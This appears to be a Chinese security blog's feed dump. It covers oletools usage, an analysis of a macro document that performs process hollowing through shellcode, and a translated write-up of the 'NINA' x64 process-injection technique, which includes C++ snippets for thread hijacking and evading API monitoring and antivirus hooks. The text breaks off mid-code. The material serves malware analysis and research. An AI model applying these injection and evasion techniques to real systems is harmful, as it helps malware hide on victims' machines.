class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">oletimes DIAN_caso-5415.doc</span></span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br><span class="line">| Stream/Storage name        | Modification Time   | Creation Time       |</span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br><span class="line">| Root                       | 2014-05-14 12:45:24 | None                |</span><br><span class="line">| &#x27;\x01CompObj&#x27;              | None                | None                |</span><br><span class="line">| &#x27;\x05DocumentSummaryInform | None                | None                |</span><br><span class="line">| ation&#x27;                     |                     |                     |</span><br><span class="line">| &#x27;\x05SummaryInformation&#x27;   | None                | None                |</span><br><span class="line">| &#x27;1Table&#x27;                   | None                | None                |</span><br><span class="line">| &#x27;Data&#x27;                     | None                | None                |</span><br><span class="line">| &#x27;Macros&#x27;                   | 2014-05-14 12:45:24 | 2014-05-14 12:45:24 |</span><br><span class="line">| &#x27;Macros/PROJECT&#x27;           | None                | None                |</span><br><span class="line">| &#x27;Macros/PROJECTwm&#x27;         | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA&#x27;               | 2014-05-14 12:45:24 | 2014-05-14 12:45:24 |</span><br><span class="line">| &#x27;Macros/VBA/ThisDocument&#x27;  | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/_VBA_PROJECT&#x27;  | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_0&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_1&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_2&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/__SRP_3&#x27;       | None                | None                |</span><br><span class="line">| &#x27;Macros/VBA/dir&#x27;           | None                | None                |</span><br><span class="line">| &#x27;WordDocument&#x27;             | None                | None                |</span><br><span class="line">+----------------------------+---------------------+---------------------+</span><br></pre></td></tr></table></figure><h3 id="在-Python-应用程序中如何使用-oletimes"><a href="#在-Python-应用程序中如何使用-oletimes" class="headerlink" title="在 Python 应用程序中如何使用 oletimes"></a>在 Python 应用程序中如何使用 oletimes</h3><p>TODO</p><h2 id="oledir"><a href="#oledir" class="headerlink" title="oledir"></a>oledir</h2><p>oledir 可用于显示 OLE 文件的所有目录条目，包括空闲和孤立的条目。它既可以用作命令行工具，也可以用作你自己的应用程序中的 python 模块。</p><h3 id="使用方法-10"><a href="#使用方法-10" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Usage: oledir [options] &lt;filename&gt; [filename2 ...]</span><br><span class="line">Options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -r                    find files recursively in subdirectories.</span><br><span class="line">  -z ZIP_PASSWORD, --zip=ZIP_PASSWORD</span><br><span class="line">                        if the file is a zip archive, open all files from it,</span><br><span class="line">                        using the provided password (requires Python 2.6+)</span><br><span class="line">  -f ZIP_FNAME, --zipfname=ZIP_FNAME</span><br><span class="line">                        if the file is a zip archive, file(s) to be opened</span><br><span class="line">                        within the zip. Wildcards * and ? are supported.</span><br><span class="line">                        (default:*)</span><br></pre></td></tr></table></figure><h3 id="一些粟子-4"><a href="#一些粟子-4" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oledir file.doc</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/703acddb3d4ea55e05404776dd1f633d.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-oledir"><a href="#在-Python-应用程序中如何使用-oledir" class="headerlink" title="在 Python 应用程序中如何使用 oledir"></a>在 Python 应用程序中如何使用 oledir</h3><p>TODO</p><h2 id="olemap"><a href="#olemap" class="headerlink" title="olemap"></a>olemap</h2><p>以 map 的形式显示 OLE 文件中的区域，它既可以用作命令行工具，也可以用作你自己的应用程序中的 python 模块。</p><h3 id="使用方法-11"><a href="#使用方法-11" class="headerlink" title="使用方法"></a>使用方法</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Usage: olemap &lt;filename&gt;</span><br></pre></td></tr></table></figure><h3 id="一些粟子-5"><a href="#一些粟子-5" class="headerlink" title="一些粟子"></a>一些粟子</h3><p>扫描单个文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">olemap file.doc</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/09/08/d6e40951c32ba677eec3455338d68ac6.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2020/09/08/aa5dea1e23fbf5ed354c5fd4a47d5d9d.png" alt=""></p><h3 id="在-Python-应用程序中如何使用-olemap"><a href="#在-Python-应用程序中如何使用-olemap" class="headerlink" title="在 Python 应用程序中如何使用 olemap"></a>在 Python 应用程序中如何使用 olemap</h3><p>TODO</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文为 oletools 文档的中文版，原文链接：&lt;a href=&quot;https://github.com/decalage2/oletools/wiki&quot;&gt;https://github.com/decalage2/oletools/wiki&lt;/a&gt;</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="oletools" scheme="https://zeronohacker.github.io/tags/oletools/"/>
    
    <category term="office" scheme="https://zeronohacker.github.io/tags/office/"/>
    
    <category term="OLE2" scheme="https://zeronohacker.github.io/tags/OLE2/"/>
    
  </entry>
  
  <entry>
    <title>恶意文档使用 Windows API 进行 Process hollowing</title>
    <link href="https://zeronohacker.github.io/2020/08/31/maldoc-uses-windows-api-to-perform-process-hollowing/"/>
    <id>https://zeronohacker.github.io/2020/08/31/maldoc-uses-windows-api-to-perform-process-hollowing/</id>
    <published>2020-08-31T11:20:24.000Z</published>
    <updated>2021-09-19T11:39:41.814Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自: <a href="https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/">https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>恶意软件作者通常喜欢在 Office 文档中使用宏技术来替换系统中正常可执文件中的代码，这种技术称之为 Process hollowing。这篇文章的主要目的是识别这种技术并了解其使用方法，我还在 YouTube 上发布了一段 <a href="https://youtu.be/JE6QCS6no1Y">视频</a>，这段视频介绍了如何使用 Ghidra 进行 shellcode 分析。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/644d849e0e0bbe79e8fb36abd725d49e.png" alt=""></p><h2 id="让我们从宏开始"><a href="#让我们从宏开始" class="headerlink" title="让我们从宏开始"></a>让我们从宏开始</h2><p>首先，需检查宏以查看代码是从何处开始执行，在这个文档中，是以 <span class='p red'>Document_Open</span> 函数开始，这个可以在 ThisDocument 流中找到。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/fcf475b1cd5ded14ae5a1895575b2492.png" alt=""></p><p>此 Office 文档中存在大量混淆，使用 shellcode 进行 process hollowing，让我们来看下此 shellcode 在内存中的位置。</p><p>此文档中有两个流，一个是 ThisDocument，另一个是 Cowkeeper。在 Cowkeeper 流开始的部分，你会发现一些别名，这些别名最终用于进行 Windows API 调用。在这些函数中，<strong>VirtualAllocEx</strong> 和 <strong>RtlMoveMemory</strong> 可能用于内存分配，将 shellcode 复制到此处，如果你不熟悉这些 API 中的其中一个，则值得在 <a href="https://docs.microsoft.com/en-us/">MSDN</a> 上花上一些时间来研究它们。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/e16eadb5a2b84e1c3829cff9c345055b.png" alt=""></p><p>让我们跟踪这些文件使用的位置，请记住，在 VBA 中是使用别名。让我们从 betterment 开始，因为恶意文档需要内存才能将 shellcode 转入其中，betterment 是在 foam 里调用。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/532d3a4d63afbc4a2cc58fca8a6cd960.png" alt=""></p><p>betterment 或 <strong>VirtualAllowEx</strong> 将返回一个指向新分配内存的指针，值赋给了 diener，除此之外，还使用了 <strong>RtlMoveMemory</strong> 或 antecedency，下一步是找到该函数的调用位置，这个在 ThisDocument 流中 foam 调用里找到。</p><p>当你通过 bayberry 变量跟踪返回值时，你会看到在一个简单的加法中使用了它，bayberry + anklet，相加后的值，赋值给了 aprum，并用作名为 cabriolet 函数的参数。如果回顾我们前面分析过的所有别名，你会发现这个针对函数 EnumDateFormatsW，如何使用它来执行 shellcode 呢？</p><p>在 MSDN 上查询这个函数，第一个参数 ( 新分配的内存 ) 需要一个指向应用程序定义的回调函数的指针！</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/bd334e2eb48ff9e9019869c3f60cd41c.png" alt=""></p><p>最后要弄清的是在它被调用之前添加到地址基址的内容，这可能是 shellcode 的偏移量，这对于正确理解反汇编代码非常重要 ( 这实际上定义了入口点 )。 你可以继续跟踪宏以查看该值是什么，或者可以使用 Office IDE 设置断点并动态检查这些值，两者都是可行的选择。在这里我将使用动态分析。 如果在对 Cabriolet 的调用上设置断点，则将阻止其执行，并允许你查看参数的值。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/c0cab1f45b4c49d792e9a65be2826d89.png" alt=""></p><p>aprum 的十六进制值为 ( 在这种情况下，这个地址值会发生变化 )：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/41b76d0389bc7667951e592da4618be6.png" alt=""></p><p>使用 Process Hacker 2 来查看进程的内存，RWX 的基址位于 0x70D0000 处，那也就意味着偏移为 0xE5D。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/8113ff70f13cb2a3741ac8648ad0e87c.png" alt=""></p><p>下面就为这段 shellcode：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/e9f9ece0f54b7864a57857ea1dc58fd9.png" alt=""></p><h2 id="分析-shellcode"><a href="#分析-shellcode" class="headerlink" title="分析 shellcode"></a>分析 shellcode</h2><p>提取 shellcode 代码后，对此进行反汇编，这样才能对它进行分析。你可以先将此 shellcode 加载到反汇编程序中，本文使用的是 Ghidra，一旦加载分析了 shellcode 代码，请转到偏移为 0xE5D 定义的函数处。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/acf2882c86ed15e7d1a9f1d71d515b84.png" alt=""></p><p>由于这是 shellcode，因此需要它自身的导入表结构。通常在程序加载过程中，操作系统会为该程序处理该操作，因为 shellcode 不会自行完成正常的加载过程。在检查代码时，你会注意到十六进制值序列被移到堆栈中：</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/4670041c9cb5d9afaebc2d96bb8f7847.png" alt=""></p><p>你还会注意到在此一串值后面调用了 sub_cf1。第一个用到称为 stack-strings 的技术，程序正在构建需要解析的 API 的 ASCII 字符串。如果右键单击每个十六进制值，则可以将显示更改为字符常量。</p><p>有意义的是，每当使用这些字符串时，都必须具有解决这些函数的能力。在大多数的 shellcode 中，stack strings 之后都会调用 sub_cf1。你可以通过执行动态分析来确认这一点，在对 sub_cf1 的调用上 ( 或之后 ) 设置断点，并检查 EAX 寄存器的内容，它应为字符串中函数的指针。</p><p>当然，遍历二进制文件并更改所有这些类型可能是乏味的，由于 Ghidra 具有插件框架，因此你可以通过此类插件来使这项工作自动化。值得花一些时间搜索现有的插件，也许已经存在！提示，你可以在 <a href="https://github.com/0x6d696368/ghidra_scripts/blob/master/SearchSimpleStackStrings.py">这里</a> 找到一个。</p><p>如果你想了解如何解析函数地址，可以花一些时间来分析 sub_cf1。但是，我们的重点是找到 process hollowing 技术，包括以下API：</p><ul><li>CreateProcess</li><li>ZwUnmapViewOfSection</li><li>VirtualAlloc</li><li>WriteProcessMemory</li><li>GetThreadContext</li><li>SetThreadContext</li><li>ResumeThread</li></ul><p>一旦能够识别这些字符串，就可以在 shellcode 中跟踪如何以及何时使用它们。其中大多数在偏移 0x11d5 处。</p><p><img src="https://image.zeronohacker.com/article/2020/08/31/8204c83e69e72f62dae1d391b23ba185.png" alt=""></p><p>CreateProcess 将所需的 EXE 加载到内存中，其中一个参数将是 EXE 的路径，另一个将是在挂起状态下创建进程。以挂起状态启动会阻止进程开始执行。 ZwUnmapViewOfSection 将用于删除所选二进制文件的原始 TEXT 部分，这使 shellcode 可以调用 VirtualAlloc 分配新的内存，并与 WriteProcessMemory 一起将新的代码复制到进程中。从那里，它将调用 GetThreadContext 并使用返回的值更新新代码的入口点。最后的步骤是调用 SetThreadContext 和 ResumeThread。现在看来，SVCHOST 的一个实例正在 System32 目录中运行，但是实际的代码已被替换！</p><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>Tria.ge：<a href="https://tria.ge/reports/200317-pt9rcrh1l2/behavioral1">https://tria.ge/reports/200317-pt9rcrh1l2/behavioral1</a></p><p>shellcode：<a href="https://github.com/jstrosch/malware-samples/tree/master/maldocs/hancitor/2016/October">https://github.com/jstrosch/malware-samples/tree/master/maldocs/hancitor/2016/October</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自: &lt;a href=&quot;https://0xevilc0de.com/maldoc-uses-windows-api-to-perform-process-hollowing/&quot;&gt;https://0xevilc0de.com/maldoc-</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Process hollowing" scheme="https://zeronohacker.github.io/tags/Process-hollowing/"/>
    
  </entry>
  
  <entry>
    <title>x64 进程注入技术 —— NINA</title>
    <link href="https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/"/>
    <id>https://zeronohacker.github.io/2020/06/05/nina-x64-process-injection/</id>
    <published>2020-06-05T10:04:25.000Z</published>
    <updated>2021-09-19T11:17:39.408Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://undev.ninja/nina-x64-process-injection/">https://undev.ninja/nina-x64-process-injection/</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在本文中，我将详细介绍一种实验性的进程注入技术，其中对比较通用的和“危险”函数使用施加了严格的限制，即 <strong>WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。 我称这种技术为 NINA：No Injection，No Allocation。 该技术的目的是为了通过减少可疑的 call 数量而不需要复杂的 ROP 链进而达到更加的隐蔽效果。 PoC 可以在这里找到：</p><p><a href="https://github.com/NtRaiseHardError/NINA">https://github.com/NtRaiseHardError/NINA</a></p><p>测试环境：</p><ul><li>Windows 10 x64 version 2004</li><li>Windows 10 x64 version 1903</li></ul><h2 id="实现-No-Injection"><a href="#实现-No-Injection" class="headerlink" title="实现 No Injection"></a>实现 No Injection</h2><p>让我们从移除需要注入的数据这种情况开始。最基本的进程注入所需要的操作：</p><ul><li>包含 payload 的目标地址；</li><li>将 payload 传递给目标进程；</li><li>执行操作以执行 payload；</li></ul><p>为了将重点放在 No Injection 部分，我将使用经典的 VirtualAllocEx 在远程进程中分配内存。 重要的是要防止页面同时具有写和执行权限，因此应首先设置 RW，然后在写入数据后用 RX 重新保护。 由于我稍后将讨论 No Allocation 方法，因此我们现在可以将页面设置为 RWX，以使事情变得简单。</p><p>如果我们限制自己不使用数据注入，则意味着恶意进程不会使用 WriteProcessMemory 将数据直接从自身传输到目标进程。 为了解决这个问题，我受到Deep Instinct（复杂）“Inject Me”进程注入技术（由 @slaeryan 分享）记录的反向 ReadProcessMemory 的启发。 还有其他将数据传递到进程的方法：使用 GlobalGetAtomName（来自 Atom Bombing 技术），以及通过命令行选项或环境变量传递数据（使用 CreateProcess 调用来生成目标进程）。 但是，这三种方法有一个小的限制，那就是 payload 不得包含 NULL 字符。 Ghost Writing 也许是一种选择，但它需要复杂的 ROP 链。</p><p>为了得到执行，我选择了 SetThreadContext 函数的线程劫持技术，因为我们不能使用 <strong>CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread</strong>。</p><p>下面是大体的一个过程：</p><ul><li>CreateProcess 生成目标进程；</li><li>VirtualAllocEx 为 payload 和堆栈分配内存；</li><li>SetThreadContext 强制目标进程执行 ReadProcessMemory；</li><li>SetThreadContext 执行 payload；</li></ul><h3 id="CreateProcess"><a href="#CreateProcess" class="headerlink" title="CreateProcess"></a>CreateProcess</h3><p>使用这种注入技术时应考虑一些注意事项。 第一个是来自 CreateProcess 的调用。 尽管此技术不依赖于 CreateProcess，但出于某些原因，使用它代替诸如 OpenProcess 或 OpenThread 之类的方法可能更有利。 原因之一是，没有远程（外部）进程访问权限来获取句柄，否则这些句柄可能会被使用ObRegisterCallbacks 的监视工具（例如 Sysmon）检测到。 另一个原因是，它允许使用命令行和环境变量进行上述两种数据注入方法。 如果您正在创建进程，则还可以利用 <a href="https://blog.xpnsec.com/protecting-your-malware/">blockdll 和 ACG</a> 来击败防病毒用户模式下 HOOK。</p><h3 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h3><p>当然，目标进程需要能够容纳 payload，但是此技术还需要堆栈。 这将很快阐明。</p><h3 id="ReadProcessMemory"><a href="#ReadProcessMemory" class="headerlink" title="ReadProcessMemory"></a>ReadProcessMemory</h3><p>要以相反的方式使用此功能，我们必须考虑两个问题：在堆栈上传递 5 个参数，并对我们自己的恶意进程使用有效的进程句柄。 让我们先来看第 5 个参数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  HANDLE  hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPCVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">  LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T  *lpNumberOfBytesRead</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>使用 SetThreadContext 仅允许在 x64 上使用前四个参数。 如果我们阅读 lpNumberOfBytesRead 的描述，我们可以看到它是可选的：</p><div class="tip "><p>指向变量的指针，该变量接收传输到指定缓冲区的字节数， 如果 lpNumberOfBytesRead 为 NULL，则忽略该参数。</p></div><p>幸运的是，如果我们使用 VirtualAllocEx 创建页面，该函数会将它们归 0：</p><div class="tip "><p>在指定进程的虚拟地址空间内保留，提交或更改内存区域的状态， 该函数将其分配的内存初始化为 0。</p></div><p>将堆栈设置为 0 分配的页面将使得第 5 个参数有效。</p><p>第二个问题是传递给 ReadProcessMemory 的进程句柄。 因为我们正试图让目标进程读取我们的恶意进程，所以我们需要为其提供处理程序的句柄。 这可以使用 DuplicateHandle 函数来实现。 它会被赋予我们当前进程句柄，并返回一个可以被目标进程使用的句柄。</p><h3 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h3><p>SetThreadContext 是强大而灵活的功能，它允许读取，写入和执行。 但是，使用它传递 fastcall 参数存在一个已知问题：易失性寄存器 RCX，RDX，R8 和 R9 无法可靠地设置为所需值。考虑以下代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to read shellcode</span></span><br><span class="line"><span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    <span class="comment">// Target thread</span></span><br><span class="line">    &amp;TargetThread,</span><br><span class="line">    <span class="comment">// Set RIP to read our shellcode</span></span><br><span class="line">    _ReadProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to stack</span></span><br><span class="line">    StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Handle to our own process to read shellcode</span></span><br><span class="line">    TargetProcess,</span><br><span class="line">    <span class="comment">// RDX: Address to read from</span></span><br><span class="line">    &amp;Shellcode,</span><br><span class="line">    <span class="comment">// R8: Buffer to store shellcode</span></span><br><span class="line">    TargetBuffer,</span><br><span class="line">    <span class="comment">// R9: Size to read</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>如果执行此代码，我们期望当目标线程到达 ReadProcessMemory 时，易失性寄存器将保持其正确的值。但是，这不是实际发生的情况：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CA9DFE2D9145CECD6F71BB5D689CDEF4.png" alt=""></p><p>由于某些未知的原因，易失性寄存器被更改，使该技术无法使用。 RCX 不是进程的有效句柄，RDX 为 0，R9 太大。 我发现一种方法可以可靠地设置易失性寄存器：在使用 SetThreadContext 之前，只需将 RIP 设置为无限 jmp -2 循环即可。 让我们来看看它的作用：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/7BAF12FF23B954527B4D2C75D76C46EF.png" alt=""></p><p>可以使用 SetThreadContext 执行无限循环，然后可以使用正确的易失性寄存器调用 ReadProcessMemory：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/A6000B5907CB4BE65EB45AB86CF3F805.png" alt=""></p><p>现在我们需要处理返回。 请注意，我们已分配并转至我们自己的堆栈。 如果我们可以使用 ReadProcessMemory 将 Shellcode 读入 RSP 的堆栈位置，则可以设置 Shellcode 的前 8 个字节，以便它重新回到自身。 这是一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to Shellcode + 8</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/06/05/420994740F05B40711840E38FCA670AA.png" alt=""></p><p>RSP 和 R8 指向 000001F457C21000。 向上的地址将用于 ReadProcessMemory 调用中的堆栈。 将要写入 Shellcode 的目标缓冲区从 R8 向下。 当 ReadProcessMemory 返回时，它将使用 shellcode 的前 8 个字节作为实际 shellcode 起始处的 000001F457C21008 的返回地址：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/39788EDE3F4EA6FFEF7F7CFF5C75109B.png" alt=""></p><h2 id="实现：No-Allocation"><a href="#实现：No-Allocation" class="headerlink" title="实现：No Allocation"></a>实现：No Allocation</h2><p>现在让我们讨论如何通过移除对 VirtualAllocEx 的依赖来进行改进。 这与上一节相比并不那么琐碎，因为会出现一些初始问题：</p><ul><li>我们如何为 ReadProcessMemory 设置堆栈</li><li>如果没有 RWX 节，如何使用 ReadProcessMemory 编写和执行 Shellcode</li></ul><p>但是，为什么要在已经可以使用的内存中分配内存呢？ 请记住，如果内存中的任何现有页面都受到影响，则应注意不要覆盖任何关键数据（如果应恢复原始执行流程）。</p><h3 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h3><p>如果我们无法为堆栈分配内存，则可以找到一个空白的 RW 页面来使用。如果担心 ReadProcessMemory 的第 5 个参数为 NULL，则可以轻松解决。 如果我们不想覆盖潜在的关键数据，则可以利用可执行映像内可能的 RW 页面内的节填充。 当然，这假定存在可用的填充。</p><p>要在可执行映像的内存范围内定位 RW 页面，我们可以通过进程环境块（PEB）定位映像的基址，然后使用 VirtualQueryEx 枚举范围。 此函数将返回诸如保护及其大小之类的信息，这些信息可用于查找任何现有的 RW 页面，以及它们的大小是否适合 Shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get PEB.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">NtQueryInformationProcess</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInformation,</span><br><span class="line">    &amp;ProcessBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESS_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get image base.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ProcessBasicInfo.PebBaseAddress,</span><br><span class="line">    &amp;Peb,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(PEB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    ImageBaseAddress = Peb.Reserved3[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get DOS header.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ImageBaseAddress,</span><br><span class="line">    &amp;DosHeader,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_DOS_HEADER),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get NT headers.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    (LPBYTE)ImageBaseAddress + DosHeader.e_lfanew,</span><br><span class="line">    &amp;NtHeaders,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(IMAGE_NT_HEADERS),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Look for existing memory pages inside the executable image.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = <span class="number">0</span>; i &lt; NtHeaders.OptionalHeader.SizeOfImage; i += MemoryBasicInfo.RegionSize) &#123;</span><br><span class="line">    <span 